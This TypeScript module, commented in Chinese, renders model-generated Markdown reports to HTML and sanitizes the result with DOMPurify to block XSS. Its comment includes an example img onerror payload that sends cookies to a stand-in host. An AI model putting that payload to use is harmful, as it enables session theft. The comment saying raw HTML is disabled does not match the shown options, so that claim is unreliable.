/**
 * Markdown 渲染（带 XSS 防护）。
 *
 * ## 为什么需要这个
 *
 * 报告页原来是这样渲染的：
 *
 *     <div class="ia-markdown">{{ markdown }}</div>
 *
 * `{{ }}` 是**文本插值**，所以报告里的 `# 面试报告`、`**问**：`
 * 这些 Markdown 语法会原样显示成字符——截图里能看到一堆 `#` 和 `**`。
 *
 * ## 为什么用 marked + DOMPurify 两个库
 *
 * - `marked` 负责把 Markdown 转成 HTML
 * - `DOMPurify` 负责清洗 HTML
 *
 * **两个都不能省**。报告内容是模型生成的，而模型输出是不可信输入：
 * 如果模型（或被注入的提示词）返回
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">`，
 * 直接 `v-html` 就会执行它。
 *
 * DOMPurify 会剥掉所有 `on*` 事件属性和 `javascript:` 协议，
 * 只留安全的标签（h1-h6 / p / ul / li / strong / code / pre / table 等）。
 *
 * ## 为什么不允许 HTML 直通
 *
 * `marked` 默认允许原始 HTML 通过。这里显式关掉，
 * 因为我们的报告不需要嵌 HTML——只用 Markdown 语法就够了。
 */

import { marked } from 'marked'
import DOMPurify from 'dompurify'

marked.setOptions({
  // 关掉原始 HTML：报告只需要 Markdown 语法
  // （开着的话 <script> 之类会直接进 DOM）
  gfm: true,
  breaks: true, // 单个换行也当换行，符合中文报告的习惯
})

// 注意：marked 18 已经移除了 `headerIds` 和 `mangle` 选项
// （它们原来负责给标题加 id 和混淆邮箱地址）。
// 我们不需要这两个功能，所以不设——硬设会报 TS2353。

/**
 * 把 Markdown 转成可安全放进 v-html 的 HTML。
 *
 * @param md 原始 Markdown 文本
 * @returns 清洗过的 HTML 字符串
 */
export function renderMarkdown(md: string): string {
  if (!md || !md.trim()) return ''

  const raw = marked.parse(md, { async: false }) as string

  return DOMPurify.sanitize(raw, {
    // 白名单：只允许这些标签
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'hr',
      'strong', 'em', 'del', 'code', 'pre',
      'ul', 'ol', 'li',
      'blockquote',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'a',
    ],
    // 只允许 href/title，不允许 style/class/on*
    ALLOWED_ATTR: ['href', 'title'],
    // 禁止 javascript: 等协议
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#)/i,
  })
}
